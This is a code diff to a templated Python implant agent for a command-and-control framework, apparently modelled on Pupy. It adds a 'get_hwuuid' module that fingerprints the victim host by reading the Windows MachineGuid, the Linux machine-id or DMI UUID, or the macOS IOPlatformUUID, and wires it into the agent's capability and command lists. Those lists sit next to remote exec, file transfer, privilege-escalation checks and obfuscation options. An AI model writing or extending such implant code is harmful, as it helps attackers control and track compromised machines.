@@ -637,6 +637,7 @@ def _action_bind() -> None:
     table["netstat"] = lambda task: mod_netstat()
     table["process_kill"] = lambda task: mod_process_kill(task)
     table["pwd"] = lambda task: mod_pwd()
+    table["get_hwuuid"] = lambda task: mod_hwuuid()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -711,7 +712,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1508,6 +1509,49 @@ def mod_pwd():
         return {"error": f"cannot determine the working directory: {exc}"}
 
 
+def mod_hwuuid():
+    """The host's hardware or installation identifier.
+
+    Upstream Pupy's ``get_hwuuid``. Pure stdlib on every platform -- the three
+    lookups are the reason Pupy carries an ``hwuuid.py`` glue file, not a
+    third-party dependency. Which source answered is reported, because the three
+    differ in what they actually identify: a Windows MachineGuid survives a
+    reinstall, a DMI product UUID is the mainboard, and a machine-id is the
+    installation.
+    """
+    if _pf.system().lower().startswith("win"):
+        try:
+            import winreg  # Windows-only; imported here so Linux imports stay clean
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                                r"SOFTWARE\\Microsoft\\Cryptography") as key:
+                return {"hwuuid": winreg.QueryValueEx(key, "MachineGuid")[0],
+                        "source": "registry"}
+        except Exception as exc:
+            return {"error": f"cannot read MachineGuid: {exc}"}
+
+    for path, source in (("/etc/machine-id", "machine-id"),
+                         ("/sys/class/dmi/id/product_uuid", "dmi"),
+                         ("/var/lib/dbus/machine-id", "dbus")):
+        try:
+            with open(path) as fh:
+                value = fh.read().strip()
+            if value:
+                return {"hwuuid": value, "source": source}
+        except Exception:
+            continue
+
+    try:
+        p = _sp.run(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
+                    capture_output=True, text=True, timeout=15)
+        m = _re.search(r'"IOPlatformUUID"\s*=\s*"([^"]+)"', p.stdout or "")
+        if m:
+            return {"hwuuid": m.group(1), "source": "ioreg"}
+    except Exception:
+        pass
+
+    return {"error": "no hardware identifier available on this host"}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2206,7 +2250,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2331,7 +2375,8 @@ def _parse_command(text: str) -> dict:
         return {"action": "exec", "command": text}
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
-    if v in ("sysinfo", "network", "netstat", "pwd", "privesc_check", "privesc_suggest", "ping"):
+    if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid",
+             "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
         # Both words answer the server's capability by that name. A word the
